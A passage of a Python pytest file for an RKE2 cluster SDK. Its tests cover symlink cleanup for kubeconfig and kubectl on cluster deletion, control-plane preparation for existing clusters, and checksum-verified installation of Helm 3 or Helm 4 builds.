    # So a cluster built before this existed picks it up without a rebuild.
    stub_out_provisioning(backend, monkeypatch)
    backend.create(three_node_cluster("tooling-update"))
    prepared = []
    monkeypatch.setattr(
        backend, "_prepare_control_plane", lambda node, path: prepared.append(node.address)
    )

    backend.update(three_node_cluster("tooling-update"))

    assert prepared == ["server-1"]


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_delete_removes_only_the_links_the_sdk_made(backend, monkeypatch, tmp_path):
    stub_out_provisioning(backend, monkeypatch)
    monkeypatch.setattr(backend, "_teardown_node", lambda node: None)
    unlinked = []
    monkeypatch.setattr(backend, "_unlink_kubectl", lambda node: unlinked.append(node.address))
    target = tmp_path / "kubeconfig"
    target.write_text("apiVersion: v1\n")
    backend._link_default_kubeconfig(str(target))
    cluster = three_node_cluster("tooling-delete")
    cluster.kubeconfig_path = str(target)
    backend.create(cluster)

    backend.delete("tooling-delete")

    assert unlinked == ["server-1"]
    assert not os.path.lexists(backend.default_kubeconfig_path)


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_delete_keeps_a_default_kubeconfig_that_is_not_ours(backend, monkeypatch, tmp_path):
    stub_out_provisioning(backend, monkeypatch)
    monkeypatch.setattr(backend, "_teardown_node", lambda node: None)
    link = backend.default_kubeconfig_path
    os.makedirs(os.path.dirname(link))
    os.symlink(str(tmp_path / "another-cluster"), link)
    cluster = three_node_cluster("tooling-keep")
    cluster.kubeconfig_path = str(tmp_path / "kubeconfig")
    backend.create(cluster)

    backend.delete("tooling-keep")

    assert os.path.islink(link)


def test_kubectl_unlink_only_removes_rke2s_link(backend, monkeypatch):
    calls = scripted_run(backend, monkeypatch, {})

    backend._unlink_kubectl(RKE2Node(address="10.0.0.1", role="server"))

    ((command, _),) = calls
    assert '[ "$(readlink /usr/local/bin/kubectl)" = /var/lib/rancher/rke2/bin/kubectl ]' in command
    assert "rm -f /usr/local/bin/kubectl" in command


def test_prepare_control_plane_uses_the_saved_first_server(backend, monkeypatch):
    # For a cluster built before create() did this: no spec to restate,
    # nothing about the cluster itself changed.
    stub_out_provisioning(backend, monkeypatch)
    cluster = three_node_cluster("tooling-later")
    cluster.kubeconfig_path = "/tmp/kc.yaml"
    backend.create(cluster)
    prepared = []
    monkeypatch.setattr(
        backend, "_prepare_control_plane", lambda node, path: prepared.append((node.address, path))
    )

    backend.prepare_control_plane("tooling-later")

    assert prepared == [("server-1", "/tmp/kc.yaml")]


def test_prepare_control_plane_needs_a_cluster_the_sdk_built(backend):
    with pytest.raises(RKE2Error, match="no state found for cluster 'nope'"):
        backend.prepare_control_plane("nope")


# -- which Helm major gets installed -------------------------------------
# pyhelm3, the SDK's own Helm layer, targets 3. Against a 4 it still works
# but rewrites deprecated flags as it goes, which is a compatibility shim
# rather than support -- so 3 is what gets installed unless asked otherwise,
# and the operator's helm then matches the one the SDK drives.


def test_the_default_is_helm_3():
    """Pinned by major deliberately. A bump to 4 here would silently change
    what every control-plane node gets."""
    assert HELM_VERSION.startswith("v3.")
    assert HELM_V4_VERSION.startswith("v4.")


@pytest.mark.parametrize("machine, arch", [("x86_64", "amd64"), ("aarch64", "arm64")])
def test_helm_v4_installs_the_v4_build_and_its_own_checksum(backend_v4, monkeypatch, machine, arch):
    calls = scripted_run(backend_v4, monkeypatch, {"command -v helm": "", "uname -m": machine})

    backend_v4._install_helm(RKE2Node(address="10.0.0.1", role="server"))

    script = next(c for c, _ in calls if "get.helm.sh" in c)
    assert f"https://get.helm.sh/helm-{HELM_V4_VERSION}-linux-{arch}.tar.gz" in script
    assert f"= {HELM_V4_SHA256[arch]} ]" in script
    # The 3 build's hash must not travel with the 4 tarball: that pairing
    # would refuse every install, and only on a real node.
    assert HELM_SHA256[arch] not in script


def test_the_two_majors_do_not_share_a_checksum():
    """Guards the copy/paste that would make the flag change the URL and
    not the hash."""
    for arch in HELM_SHA256:
        assert HELM_SHA256[arch] != HELM_V4_SHA256[arch]


def test_an_existing_helm_is_kept_whichever_major_was_asked_for(backend_v4, monkeypatch):
    """The flag decides what gets installed, never what gets replaced."""
    calls = scripted_run(
        backend_v4,
        monkeypatch,
        {
            "command -v helm": "/usr/local/bin/helm\n",
            "version --short": "v3.15.0",
        },
    )

    backend_v4._install_helm(RKE2Node(address="10.0.0.1", role="server"))

    assert not any("get.helm.sh" in c for c, _ in calls)
